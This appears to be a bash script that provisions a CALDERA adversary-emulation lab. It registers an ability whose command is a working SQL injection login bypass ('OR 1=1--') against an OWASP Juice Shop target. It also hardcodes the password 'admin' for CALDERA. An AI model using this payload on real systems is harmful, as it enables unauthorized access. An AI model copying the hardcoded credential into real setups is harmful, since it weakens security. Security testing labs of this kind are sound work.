#!/usr/bin/env bash
# ensure-caldera-abilities.sh
#
# Provisions custom CALDERA abilities and adversaries statelessly on
# every boot, rather than relying on CALDERA's own persisted database
# state -- which has proven unreliable (an encryption-key mismatch
# crash-looped the container, and --fresh recovery discards custom
# content along with corrupted state). Idempotent: checks whether
# each definition already exists by its fixed ID before creating it,
# so a healthy instance sees no changes, and a wiped one self-heals.
#
# Real ability/adversary definitions live as committed YAML in
# caldera/abilities/ -- this script is the mechanism that applies
# them, not the source of truth itself.

set -euo pipefail

CALDERA_URL="http://localhost:8888"
COOKIE_FILE=$(mktemp)
trap 'rm -f "$COOKIE_FILE"' EXIT

#PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" \
#  "http://metadata.google.internal/computeMetadata/v1/project/project-id")
#CALDERA_RED_PASSWORD=$(gcloud secrets versions access latest \
#  --secret=caldera-red-password --project="$PROJECT_ID")
CALDERA_RED_PASSWORD="admin"

curl -s -c "$COOKIE_FILE" -X POST "$CALDERA_URL/enter" \
  -d "username=red&password=$CALDERA_RED_PASSWORD" > /dev/null

ability_exists() {
  local ability_id="$1"
  local status
  status=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE_FILE" \
    "$CALDERA_URL/api/v2/abilities/$ability_id")
  [ "$status" == "200" ]
}

adversary_exists() {
  local adversary_id="$1"
  local status
  status=$(curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE_FILE" \
    "$CALDERA_URL/api/v2/adversaries/$adversary_id")
  [ "$status" == "200" ]
}

echo "Checking Juice Shop SQLi ability..."
JUICE_SHOP_ABILITY_ID="77f2e364-441f-4b19-8a53-d56640123bc5"
if ability_exists "$JUICE_SHOP_ABILITY_ID"; then
  echo "  Already present -- skipping."
else
  echo "  Missing -- creating."
  curl -s -X POST -b "$COOKIE_FILE" -H "Content-Type: application/json" \
    "$CALDERA_URL/api/v2/abilities" \
    -d @- <<'ABILITYJSON'
{
  "ability_id": "77f2e364-441f-4b19-8a53-d56640123bc5",
  "name": "Juice Shop SQL Injection Login Bypass",
  "description": "Exploit a classic SQL injection vulnerability in OWASP Juice Shop's login endpoint to bypass authentication without valid credentials.",
  "tactic": "initial-access",
  "technique_id": "T1059.004",
  "technique_name": "Command and Scripting Interpreter: Bash",
  "executors": [
    {
      "name": "sh",
      "platform": "linux",
      "command": "curl -sk -X POST https://web-target/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\"",
      "timeout": 60
    }
  ],
  "singleton": false,
  "repeatable": false
}
ABILITYJSON
  echo "  Created."
fi

echo "Checking Juice Shop SQLi adversary profile..."
JUICE_SHOP_ADVERSARY_ID="14db9072-5406-4645-ba34-f7d9a25b1fd5"
if adversary_exists "$JUICE_SHOP_ADVERSARY_ID"; then
  echo "  Already present -- skipping."
else
  echo "  Missing -- creating."
  curl -s -X POST -b "$COOKIE_FILE" -H "Content-Type: application/json" \
    "$CALDERA_URL/api/v2/adversaries" \
    -d "{
      \"adversary_id\": \"$JUICE_SHOP_ADVERSARY_ID\",
      \"name\": \"Juice Shop SQLi Test\",
      \"description\": \"workstation to web target sqli bypass\",
      \"atomic_ordering\": [\"$JUICE_SHOP_ABILITY_ID\"]
    }"
  echo "  Created."
fi

echo "Ability/adversary provisioning complete."
